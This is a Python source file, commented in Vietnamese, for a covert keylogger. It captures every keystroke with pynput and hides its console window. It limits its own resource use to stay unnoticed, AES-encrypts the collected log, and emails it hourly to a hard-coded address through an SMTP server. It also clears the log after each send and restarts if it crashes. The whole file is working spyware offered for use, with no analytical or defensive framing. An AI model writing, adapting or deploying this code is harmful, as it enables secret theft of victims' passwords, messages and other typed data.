import logging
import os
import threading
import zipfile
import base64
import smtplib
import ctypes
import psutil
from pynput.keyboard import Listener, Key
from Crypto.Cipher import AES
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Cấu hình
LOG_DIR = os.path.join(os.getenv("TEMP", "/tmp"), "keylogger_logs")
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
EMAIL_INTERVAL =  3600 # Thời gian gửi log
EMAIL_ADDRESS = "64xxxxxxxxxxxxx"
EMAIL_PASSWORD = "09xxxxxxxxxxx"
TO_EMAIL = "xxxxxxxxx@gmail.com"
SMTP_SERVER = "xxxxxxx.smtltp.mail.io"
SMTP_PORT = 2525
SECRET_KEY = b'16byteslongkey!!'  # Đảm bảo đúng 16, 24 hoặc 32 byte
BUFFER_SIZE = 50  # Giới hạn bộ đệm
buffer = []

# Tạo thư mục log nếu chưa có
os.makedirs(LOG_DIR, exist_ok=True)

# Cấu hình logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

# Hàm giới hạn tài nguyên
def limit_resources():
    p = psutil.Process(os.getpid())
    p.nice(psutil.IDLE_PRIORITY_CLASS if os.name == 'nt' else 10)
    p.rlimit(psutil.RLIMIT_CPU, (1, 1))
    p.rlimit(psutil.RLIMIT_AS, (256 * 1024 * 1024, 256 * 1024 * 1024))  # Giới hạn RAM 256MB

# Hàm mã hóa log
def encrypt_log(data):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, _ = cipher.encrypt_and_digest(data.encode())
    return base64.b64encode(nonce + ciphertext).decode()

# Ghi log vào file từ bộ đệm
def write_to_file():
    global buffer
    if buffer:
        with open(LOG_FILE, "a") as log_file:
            log_file.write("".join(buffer))
        buffer = []

# Hàm xử lý phím bấm
def on_press(key):
    global buffer
    try:
        buffer.append(key.char)
    except AttributeError:
        special_keys = {
            Key.enter: "\n",
            Key.space: " ",
            Key.tab: "\t",
            Key.shift: "[SHIFT]",
            Key.ctrl: "[CTRL]",
            Key.alt: "[ALT]",
            Key.backspace: "[BACKSPACE]",
            Key.esc: "[ESC]",
            Key.delete: "[DELETE]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]"
        }
        buffer.append(special_keys.get(key, f"[{key.name}]") )
    if len(buffer) >= BUFFER_SIZE:
        write_to_file()

# Gửi email log đã mã hóa
def send_email_with_log():
    while True:
        try:
            with open(LOG_FILE, 'r') as log_file:
                log_content = log_file.read()

            if log_content:
                encrypted_log = encrypt_log(log_content)
                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = TO_EMAIL
                msg['Subject'] = "Encrypted Keylogger Logs"
                msg.attach(MIMEText(encrypted_log, 'plain'))
                
                server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
                server.quit()
                
                open(LOG_FILE, 'w').close()
                logging.info("Logs sent and cleared.")
        except Exception as e:
            logging.error(f"Failed to send log: {e}")
            print(f"Error: {e}")
        
        threading.Event().wait(EMAIL_INTERVAL)

# Ẩn cửa sổ console
def hide_window():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

# Chạy keylogger với xử lý lỗi tự động restart
def run_keylogger():
    while True:
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()
        except Exception as e:
            logging.error(f"Keylogger crashed: {e}")
            print(f"Keylogger crashed: {e}")

if __name__ == "__main__":
    hide_window()
    limit_resources()
    threading.Thread(target=send_email_with_log, daemon=True).start()
    run_keylogger()
